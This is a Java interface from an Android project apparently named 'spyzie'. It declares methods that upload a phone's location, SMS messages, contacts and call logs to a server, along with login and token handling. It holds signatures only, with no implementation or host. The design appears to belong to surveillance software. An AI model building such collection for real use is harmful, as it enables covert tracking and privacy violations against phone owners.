package com.tantd.spyzie.data.network;

import com.tantd.spyzie.data.model.Call;
import com.tantd.spyzie.data.model.CommonResponse;
import com.tantd.spyzie.data.model.Contact;
import com.tantd.spyzie.data.model.Error;
import com.tantd.spyzie.data.model.Event;
import com.tantd.spyzie.data.model.Location;
import com.tantd.spyzie.data.model.LoginData;
import com.tantd.spyzie.data.model.Sms;

import java.util.List;

import io.reactivex.Single;

/**
 * Created by tantd on 2/26/2020.
 */
public interface ApiManager {

    Single<List<Event>> getSchedules();

    Single<LoginData.Response> login(LoginData.Request account);

    void storeAccessToken(String accessToken);

    String getAccessToken();

    Single<CommonResponse> sendLocationData(Location location);

    Single<CommonResponse> sendLocationData(List<Location> locations);

    Single<CommonResponse> sendSmsData(Sms sms);

    Single<CommonResponse> sendSmsData(List<Sms> sms);

    Single<CommonResponse> sendContactsData(List<Contact> contacts);

    Single<CommonResponse> sendCallsData(List<Call> calls);

    Single<CommonResponse> sendExceptionTracking(Error error);
}
